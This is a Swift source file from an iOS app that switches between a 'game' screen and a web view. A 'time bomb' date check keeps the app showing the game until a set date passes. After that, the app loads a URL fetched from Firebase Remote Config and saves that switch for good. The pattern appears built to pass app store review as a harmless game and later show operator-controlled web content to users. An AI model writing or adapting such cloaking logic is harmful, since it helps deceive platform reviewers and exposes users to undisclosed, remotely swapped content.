//
//  AppStateLogic.swift
//
//
//  Created by Yevhen Khyzhniak on 30.10.2023.
//

import Foundation
import Combine
import Firebase
import FirebaseRemoteConfig

public enum AppState: Codable, Equatable {
    case idle
    case game
    case web(URL)
}

public class AppStateLogic {
    
    public let state: PassthroughSubject<AppState, Never> = .init()
    
    public init(redirect: RedirectLogic, initURLConst: String) {
        self.redirect = redirect
        self.initialURLConstant = initURLConst
    }
    
    @Storage(key: "WebBusiness.AppStateKey", defaultValue: .idle)
    private var appState: AppState
    
    @Storage(key: "WebBusiness.InitialURLConstantKey", defaultValue: "")
    private var initialURLConstant: String
    
    private let redirect: RedirectLogic
    
    public func onCheckAppState() {
        
        guard self.appState == .idle else {
            self.state.send(self.appState)
            return
        }
        
        Task {
            
            //debugPrint("call requestNotifications - \(Date())")
            await OneSignalService.requestNotifications()
            try await Task.sleep(nanoseconds: 2_000_000_000)
            
            // time bomb 
            guard TimeBomb.isAvailableToMakeNextStep(Date()) else {
                await MainActor.run {
                    self.state.send(.game)
                }
                return
            }
            
            var result: AppState
            
            let urlStr = await self.makeRemoteUrl()
            if urlStr.isEmpty {
                result = .game
            }
            
            if let url = URL(string: urlStr) {
                result = .web(url)
            } else {
                result = .game
            }
            
            self.appState = result
            await MainActor.run {
                self.state.send(self.appState)
            }
            
        }
    }
    
    private func makeRemoteUrl() async -> String {
        let config = RemoteConfig.remoteConfig()
        let key = "initial_dns"
        
        return await withCheckedContinuation { continuation in
            config.fetch(withExpirationDuration: 0) { (_, error) in
                guard error == nil else {
                    continuation.resume(returning: "")
                    return
                }
                config.activate()
                if  let url = config.configValue(forKey: key).stringValue {
                    continuation.resume(returning: url)
                } else {
                    continuation.resume(returning: "")
                }
            }
        }
    }
    
    
}

extension URL {
    
    func addParams(params: [String: String?]?) -> URL {
        guard let params = params else {
            return self
        }
        var urlComp = URLComponents(url: self, resolvingAgainstBaseURL: true)!
        var queryItems = [URLQueryItem]()
        for (key, value) in params {
            if let value, !value.isEmpty {
                queryItems.append(URLQueryItem(name: key, value: value))
            }
        }
        urlComp.queryItems = queryItems
        return urlComp.url!
    }
    
}
